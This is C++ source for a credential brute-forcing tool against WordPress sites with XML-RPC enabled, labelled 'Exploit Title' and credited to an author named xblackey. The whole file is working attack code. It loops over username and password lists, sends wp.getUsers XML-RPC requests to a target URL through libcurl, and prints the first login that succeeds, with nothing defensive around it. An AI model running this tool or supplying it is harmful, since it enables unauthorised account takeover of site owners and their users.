/**
 * Exploit Title: Brute force wordpress websites with xmlrpc enabled
 * Date: August 6, 2020
 * Vendor Homepage: https://wordpress.org/
 * Author: xblackey
 * Version: 1.0
 */
#include <iostream>
#include <fstream>
#include <string.h>
#include <curl/curl.h>

size_t write_to_string(void *ptr, size_t size, size_t count, void *stream)
{
    ((std::string *)stream)->append((char *)ptr, 0, size * count);
    return size * count;
}

int main(int argc, char **argv)
{
    const char *usersFilePath = argv[2];
    std::fstream users_file;
    users_file.open(usersFilePath, std::ios::in);

    const char *pwFilePath = argv[3];
    std::fstream passwords_file;
    passwords_file.open(pwFilePath, std::ios::in);

    if (!users_file)
    {
        std::cout << "Error open this file: " << usersFilePath << std::endl;
    }
    else if (!passwords_file)
    {
        std::cout << "Error open this file: " << pwFilePath << std::endl;
    }
    else
    {
        CURL *curl;
        CURLcode res;

        std::string post_str;
        std::string post1 = "<?xml version=\"1.0\" encoding=\"iso-8859-1\"?><methodCall><methodName>wp.getUsers</methodName><params><param><value>1</value></param><param><value>";
        std::string username;
        std::string post2 = "</value></param><param><value>";
        std::string password;
        std::string post3 = "</value></param></params></methodCall>";

        curl = curl_easy_init();

        if (curl)
        {
            curl_easy_setopt(curl, CURLOPT_URL, argv[1]);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_to_string);
            double count = 0;
            bool found = false;
            const char *check_fail = "faultString";
            const char *fail_code = "403";

            while (!users_file.eof() && found == false)
            {
                count = 0;
                getline(users_file, username);
                passwords_file.seekg(0, passwords_file.beg);
                char *username_c = new char[username.length() + 1];
                strcpy(username_c, username.c_str());

                while (!passwords_file.eof())
                {
                    std::string response;
                    ++count;
                    getline(passwords_file, password);

                    post_str = post1 + username + post2 + password + post3;

                    char *post = new char[post_str.length() + 1];
                    strcpy(post, post_str.c_str());

                    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post);
                    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

                    res = curl_easy_perform(curl);

                    if (res == CURLE_OK)
                    {
                        char *res_str = new char[response.length() + 1];
                        strcpy(res_str, response.c_str());

                        if (res_str != "" && strstr(res_str, check_fail) && strstr(res_str, fail_code))
                        {
                            std::cout << count << " - Fail: " << username << " - " << password << std::endl;
                        }
                        else if (strstr(res_str, username_c))
                        {
                            std::cout << std::endl
                                << res_str << std::endl;
                            std::cout << count << " - SUCCESS: " << username << " - " << password << " <=== FOUND" << std::endl;
                            found = true;
                            break;
                        }
                        else
                        {
                            std::cout << std::endl
                                << res_str << std::endl;
                            std::cout << "ERROR" << std::endl;
                        }
                    }
                    else
                    {
                        std::cout << "curl_easy_perform() failed: " << stderr << std::endl;
                    }
                }
            }

            if (!found)
            {
                std::cout << "NOT FOUND" << std::endl;
            }
        }
        else
        {
            std::cout << "ERROR !curl" << std::endl;
        }
        curl_easy_cleanup(curl);
    }
    users_file.close();
    passwords_file.close();

    return 0;
}